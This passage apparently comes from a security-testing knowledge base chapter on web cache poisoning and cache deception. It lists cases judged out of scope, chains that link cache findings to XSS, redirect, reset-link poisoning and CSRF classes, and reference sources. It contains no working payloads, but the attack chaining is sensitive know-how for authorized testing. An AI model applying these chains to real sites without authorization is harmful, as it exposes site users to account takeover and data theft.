- **`Vary` mix-ups with no security effect.** A cache that ignores `Vary: User-Agent` or `Vary: Accept-Language`
  serves the mobile page or another language to everyone: a functional bug. A missing `Vary: Origin` on a stored
  CORS response breaks other origins' requests (#591302 and #921704 are titled so): CCH-009 under `dos-ok`. `Vary:
  Cookie` ignored on per-user pages is INF-013. A reflected header that the response names in `Vary` and the cache
  ignores is CCH-001.
- **Unauthenticated purge.** A `PURGE` accepted from the internet only forces a refetch from the origin (#2679440,
  #1911568, #154278 and #1943117 are titled so); it is informative or low on most programmes. Never purge or ban
  real URLs: one `PURGE` of a URL carrying our own buster shows the behaviour.
- **Debug headers that print the key.** Akamai's `Pragma` debug values and `Fastly-Debug` are testing aids; on their
  own they are `internal-info`.
- **Not the target's web cache.** DNS cache poisoning (#487), caches inside client libraries (#137756 for okhttp,
  closed informative; #3483902 on curl's Alt-Svc cache, informative), CI and build caches (#2410111, #2255750:
  CLD-010).
- **Request smuggling into the cache.** #488147, #510152 and #919175 desynchronise edge and origin to store a
  response under another URL: the SMG chapter's ground and rules, never this chapter's.
- **A curl-only spelling.** A deceptive or normalised URL that works only because curl sent a bare `/../` or
  `%2e%2e` segment, a raw space or a raw `#`: browsers resolve or encode those, so no victim can be made to request
  it.

## Chains

- CCH-001, CCH-003, CCH-004 → CCH-002: the stored change becomes script for every client (#977851, #303730); CCH-002
  → XSS-018 for the takeover of our victim account.
- CCH-001 (a host header that builds a `Location`) → RDR-010; RDR-010 on a script URL → CCH-002, shape (c)
  (#1795197).
- CCH-001 (the same header in e-mailed links) → AUT-001 and HHI-001: reset-link poisoning. A reset page stored with
  the poisoned host is CCH-001's finding.
- CRL-001 to CRL-003 → CCH-001: a split that only a request header reaches becomes reportable once a clean client
  receives it from the cache.
- XSS-005 (an error page that prints the path) → CCH-004; XSS-016 (a cookie written into the page) → CCH-001;
  XSS-010 (a request-controlled `Content-Type`) → CCH-001 or CCH-003 when the controlling input is unkeyed.
- CCH-005, CCH-006 → CSR-008 (a stolen CSRF token forges the e-mail change), AUT-017 (a stolen session or API token
  keeps working); INF-013 is the same data stored at its normal URL.
- CCH-007 → CCH-002: what the poisoned import would run, described in the report rather than shown.
- CCH-008 ↔ SSR-001 (the fetcher behind previews), GQL-012 (persisted queries and response caches), BAC items (a
  cache that crosses a tenant boundary).
- CCH-004 spellings and CCH-001 scheme and port headers → CCH-009: the same folding or loop stored as an error,
  under `dos-ok`.
- STO-008, STO-009: a page that imports script from an unregistered domain or bucket is CCH-002's position without
  any cache.
- SMG items → CCH: a smuggled request stores its response under another URL's key (#488147).

## Sources

- `kb/reports/cache.md` and `kb/reports/all/cache.md`: the disclosed reports this chapter is built from;
  `kb/data/index.jsonl` for the counts and for reports filed under other classes (#977851, #303730, #148300,
  #263760, #1767503, #3183046).
- HexBrain: `get_testing_playbook {"topic":"Web Cache Poisoning"}`, `get_testing_playbook {"topic":"Web Cache Deception"}`,
  `find_payloads {"topic":"Web Cache Deception"}`.
- James Kettle, "Practical Web Cache Poisoning" (2018) and "Web Cache Entanglement: Novel Pathways to Poisoning"
  (2020); Omer Gil, "Web Cache Deception Attack" (2017); Hoai Viet Nguyen, Luigi Lo Iacono and Hannes Federrath,
  "Your Cache Has Fallen: Cache-Poisoned Denial-of-Service Attack" (ACM CCS 2019); Martin Doyhenard, "Gotta Cache
  'em All: Bending the Rules of Web Cache Exploitation" (Black Hat USA 2024).
- PortSwigger Web Security Academy, Web cache poisoning and Web cache deception; PayloadsAllTheThings, Web Cache
  Deception.
- RFC 9111 (HTTP caching: the key, `Vary`, storing errors), RFC 9211 (`Cache-Status`), RFC 7239 (`Forwarded`), RFC
  9112 §6.1 (an unknown transfer coding is answered 501); the WHATWG URL Standard (the percent-encode sets browsers
  apply and the dot-segments they resolve). Vendor documentation: Cloudflare's default cache behaviour, `Vary`
  handling and Cache Deception Armor; CloudFront's error-caching minimum TTL and GET requests with a body; Akamai's
  `Pragma` debug headers; Varnish's built-in VCL.
- `docs/04-evidence-standard.md` (raw captures, redaction), `docs/06-severity.md` (reference vectors),
  `playbooks/PB-14-incidents.md` (a poisoned response reaching real visitors).
